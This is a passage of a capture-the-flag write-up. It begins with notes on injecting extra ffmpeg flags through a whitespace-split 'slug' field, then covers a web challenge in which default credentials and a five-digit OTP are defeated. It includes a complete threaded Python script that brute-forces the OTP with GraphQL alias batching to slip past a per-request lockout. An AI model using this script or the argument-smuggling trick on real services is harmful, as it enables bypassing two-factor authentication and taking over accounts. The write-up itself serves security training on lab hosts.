The server builds the ffmpeg command by concatenating the `slug` into a string and splitting on whitespace to build the argv array. Every space separated word in the payload will become its own separate ffmpeg CLI flag. 

I will need to try to render 2 images (one will be a `.png`, one will be the raw bytes of a file). Starting the payload with `waveform.png` satisfies the templates normal `-map [outv] <output>` expectation. ffmgpe lets you declare multiple `-i` inputs and multiple outputs in one invocation.


## BartBrack

**Category**: web

**Author**: WebVerse (Leighlin Ramsay) x H7

**Description**: Flux is a modern business neobank: one login, two-step verification, and a clean dashboard of balances, transactions, cards, and statements.

Going to the site:

![Alt text](/images/h7web12.png)

I eventually guessed the credentials `admin:admin`:

![Alt text](/images/h7web13.png)

The otp is a 5 digit value from `00000` through `99999`. From what I could tell, the otp is global/static for a period, rather than regenerated per login/session. Making a guess for the otp sends a POST request to `/graphql.php`. I am able to bypass the two factor authentication by using graphql alias batching accross 8 different sessions, and brute forcing ~15,000 guesses per login. Over 15,000 gets you locked out. I ran this script:
```python
import requests, sys, threading, queue

HOST="https://3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com"
HOSTNAME="3a863ed5-5793-bartbrack-0e073.mystery-challenges.webverselabs-pro.com"
CF="<cf_clearance cookie>"

CHUNK=100
RANGE_PER_SESSION=14000   # stay under 15k
found = threading.Event()
lock = threading.Lock()

def fresh():
    s=requests.Session()
    s.headers["User-Agent"]="Mozilla/5.0"
    s.cookies.set("cf_clearance", CF, domain=HOSTNAME)
    s.post(HOST+"/", data={"username":"admin","password":"admin"})
    return s

def worker(start):
    if found.is_set(): return
    s=fresh()
    sid=s.cookies.get("flux_sid")
    end=min(start+RANGE_PER_SESSION, 100000)
    print(f"[w] {sid} range {start}-{end}")
    lo=start
    while lo<end and not found.is_set():
        codes=[f"{i:05d}" for i in range(lo, min(lo+CHUNK, end))]
        q="mutation{"+" ".join(f'c{c}:verifyOtp(code:"{c}"){{ok token}}' for c in codes)+"}"
        try: r=s.post(HOST+"/graphql.php", json={"query":q}, timeout=30)
        except Exception as e: print("err",lo,e); return
        t=r.text
        if "locked" in t.lower():
            print(f"[w] {sid} locked at {lo}"); return
        if "Sign in first" in t:
            print(f"[w] {sid} nosess at {lo}"); return
        try: d=r.json().get("data") or {}
        except: lo+=CHUNK; continue
        for k,v in d.items():
            if v and v.get("ok"):
                with lock:
                    if not found.is_set():
                        found.set()
                        print(f"Found code={k[1:]}  flux_sid={sid}")
                        print(f"response={v}")
                return
        lo+=CHUNK

threads=[]
start=0
while start<100000:
    t=threading.Thread(target=worker, args=(start,), daemon=True)
    t.start(); threads.append(t)
    start+=RANGE_PER_SESSION

for t in threads: t.join()
if not found.is_set(): print("nothing")
```
The script uses graphql alias batching, letting one query contain many independent mutation calls. The server executes them all in a single request so the per session lock counts one request but graphql processes 100 guesses.
